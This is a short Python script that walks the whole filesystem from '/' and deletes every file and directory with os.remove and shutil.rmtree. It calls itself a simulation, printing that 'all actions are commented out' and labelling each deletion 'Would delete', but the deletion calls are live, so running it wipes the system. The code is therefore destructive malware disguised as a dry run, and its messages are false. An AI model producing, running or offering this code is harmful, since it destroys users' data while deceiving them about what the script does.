import os
import shutil

def delete_files():

    root_dir = '/'

    for dirpath, dirnames, filenames in os.walk(root_dir):

        for filename in filenames:
            try:

                file_path = os.path.join(dirpath, filename)

                os.remove(file_path)  

                print(f"Would delete: {file_path}")

            except Exception as e:
                print(f"Error with file {file_path}: {e}")

def delete_directories():

    root_dir = '/'
    for dirpath, dirnames, filenames in os.walk(root_dir, topdown=False):
        for dirname in dirnames:
            try:
                dir_path = os.path.join(dirpath, dirname)

                shutil.rmtree(dir_path)  

                print(f"Would delete directory: {dir_path}")

            except Exception as e:
                print(f"Error with directory {dir_path}: {e}")

def main():
    print("Simulating a system-wide file and directory deletion (all actions are commented out).")

    delete_files()
    delete_directories()

if __name__ == "__main__":
    main()
